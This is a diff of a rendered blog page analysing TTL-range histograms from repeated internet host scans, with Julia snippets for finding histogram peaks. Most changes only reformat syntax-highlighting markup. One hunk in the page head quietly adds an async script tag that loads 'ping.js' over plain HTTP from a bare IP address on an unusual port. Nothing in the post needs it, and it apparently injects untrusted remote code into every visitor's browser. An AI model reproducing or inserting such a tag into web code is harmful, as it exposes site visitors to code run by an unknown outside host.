@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -92,7 +94,7 @@ November 13, 2021
 <p>The analysis shown that only 0.39998% of 43056567 unique hosts had unstable routes.</p>
 <p>However the analysis was only using a few statistics, when we plot the <em>histogram of TTL ranges</em> we see much more <strong>mysteries to solve</strong>.<!--more--></p>
 <h2 id="ttl-range-histogram-how-much-stable-is-a-route-in-a-longer-period---revised">TTL range histogram (how much stable is a route in a longer period? - revised)</h2>
-<p>We can plot <code><span class="highlight-candombe-inline"><span class="n">multirounds_range</span></span></code> in a histogram. Recap that <code><span class="highlight-candombe-inline"><span class="n">multirounds_range</span></span></code> is the range of TTLs, that means <code><span class="highlight-candombe-inline"><span class="n">rounds_ttl</span><span class="p">[</span><span class="o">:</span><span class="p">,</span><span class="ss">:max</span><span class="p">]</span> <span class="o">-</span> <span class="n">rounds_ttl</span><span class="p">[</span><span class="o">:</span><span class="p">,</span><span class="ss">:min</span><span class="p">]</span></span></code>; a quick histogram was shown before as <code><span class="highlight-candombe-inline"><span class="n">hist_biased</span></span></code>.</p>
+<p>We can plot <code><span class="highlight-candombe-inline"><span class="n">multirounds_range</span></span></code> in a histogram. Recap that <code><span class="highlight-candombe-inline"><span class="n">multirounds_range</span></span></code> is the range of TTLs, that means <code><span class="highlight-candombe-inline"><span class="n">rounds_ttl</span><span class="p">[</span><span class="o">:</span><span class="p">,</span><span class="ss">:max</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">rounds_ttl</span><span class="p">[</span><span class="o">:</span><span class="p">,</span><span class="ss">:min</span><span class="p">]</span></span></code>; a quick histogram was shown before as <code><span class="highlight-candombe-inline"><span class="n">hist_biased</span></span></code>.</p>
 <p><figure><figcaption><span markdown='1'>
 Histogram of TTL range between rounds of scans to the same host showing how much stable the routes are.
 <br /><br />
@@ -106,20 +108,20 @@ The dataset does not include hosts scanned only once. The vertical axis is in lo
 <h3 id="peaks">Peaks</h3>
 <p>Now we find where the local maxima are. We use a window of 40 to filter any peak that it is not high enough.</p>
 <p><code><span class="highlight-candombe-inline"><span class="n">strict</span><span class="o">=</span><span class="nb">false</span></span></code> is crucial because <code><span class="highlight-candombe-inline"><span class="n">argmaxima</span></span></code> ignores any peak that it is too close on the edges (for which a full window cannot be computed). Without this, the peak at 0 would be lost.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="n">julia</span><span class="o">&gt;</span> <span class="n">hist</span> <span class="o">=</span> <span class="n">fit</span><span class="p">(</span><span class="n">Histogram</span><span class="p">,</span> <span class="n">convert</span><span class="p">(</span><span class="kt">Vector</span><span class="p">{</span><span class="kt">Int32</span><span class="p">},</span> <span class="n">multirounds_range</span><span class="p">[</span><span class="o">:</span><span class="p">,</span> <span class="ss">:range</span><span class="p">]),</span> <span class="n">nbins</span><span class="o">=</span><span class="mi">255</span><span class="p">)</span>
+<div class="highlight-candombe"><pre><span></span><code><span class="n">julia</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fit</span><span class="p">(</span><span class="n">Histogram</span><span class="p">,</span><span class="w"> </span><span class="n">convert</span><span class="p">(</span><span class="kt">Vector</span><span class="p">{</span><span class="kt">Int32</span><span class="p">},</span><span class="w"> </span><span class="n">multirounds_range</span><span class="p">[</span><span class="o">:</span><span class="p">,</span><span class="w"> </span><span class="ss">:range</span><span class="p">]),</span><span class="w"> </span><span class="n">nbins</span><span class="o">=</span><span class="mi">255</span><span class="p">)</span>
 
-<span class="n">julia</span><span class="o">&gt;</span> <span class="n">argmaxima</span><span class="p">(</span><span class="n">hist</span><span class="o">.</span><span class="n">weights</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="n">strict</span><span class="o">=</span><span class="nb">false</span><span class="p">)</span> <span class="o">.-</span> <span class="mi">1</span>
-<span class="mi">4</span><span class="o">-</span><span class="n">element</span> <span class="kt">Vector</span><span class="p">{</span><span class="kt">Int64</span><span class="p">}</span><span class="o">:</span>
-   <span class="mi">0</span>
-  <span class="mi">63</span>
- <span class="mi">127</span>
- <span class="mi">191</span>
+<span class="n">julia</span><span class="o">&gt;</span><span class="w"> </span><span class="n">argmaxima</span><span class="p">(</span><span class="n">hist</span><span class="o">.</span><span class="n">weights</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="n">strict</span><span class="o">=</span><span class="nb">false</span><span class="p">)</span><span class="w"> </span><span class="o">.-</span><span class="w"> </span><span class="mi">1</span>
+<span class="mi">4</span><span class="o">-</span><span class="n">element</span><span class="w"> </span><span class="kt">Vector</span><span class="p">{</span><span class="kt">Int64</span><span class="p">}</span><span class="o">:</span>
+<span class="w">   </span><span class="mi">0</span>
+<span class="w">  </span><span class="mi">63</span>
+<span class="w"> </span><span class="mi">127</span>
+<span class="w"> </span><span class="mi">191</span>
 </code></pre></div>
 
 <p><code><span class="highlight-candombe-inline"><span class="n">argmaxima</span></span></code> returns the indexes where the peaks were found in the <code><span class="highlight-candombe-inline"><span class="n">bins</span></span></code> vector created.</p>
 <p>Julia’s vectors are 1-based indexed but those indexes also represent the TTL range values where the peak were found <strong>except</strong> that they are shifted by 1.</p>
 <p>In short, a peak at index <code><span class="highlight-candombe-inline"><span class="n">n</span></span></code> means a peak for the TTL range of <code><span class="highlight-candombe-inline"><span class="n">n</span><span class="o">-</span><span class="mi">1</span></span></code>.</p>
-<p>That’s why we do a <code><span class="highlight-candombe-inline"><span class="o">.-</span> <span class="mi">1</span></span></code>.</p>
+<p>That’s why we do a <code><span class="highlight-candombe-inline"><span class="o">.-</span><span class="w"> </span><span class="mi">1</span></span></code>.</p>
 <p>Back to the numbers, <em>what the hell do those peaks mean?</em></p>
 <h2 id="analysis-of-the-3-secondary-peaks">Analysis of the 3 secondary peaks</h2>
 <p><label for='PGltZyBzdHlsZT0id2lkdGg6IDEwMCU7IiBjbGFzcz0nZnVsbHdpZHRoJyBhbHQ9Jycgc3JjPScvaW1nL25ldHdvcmsvaW50ZXJuZXRfc2Nhbi9tdWx0aXJvdW5kc190dGxfcmFuZ2VfdW5iaWFzZWRfX2hpc3Quc3ZnJyAvPm1hcmdpbg==' class='margin-toggle'>&#8853;</label>
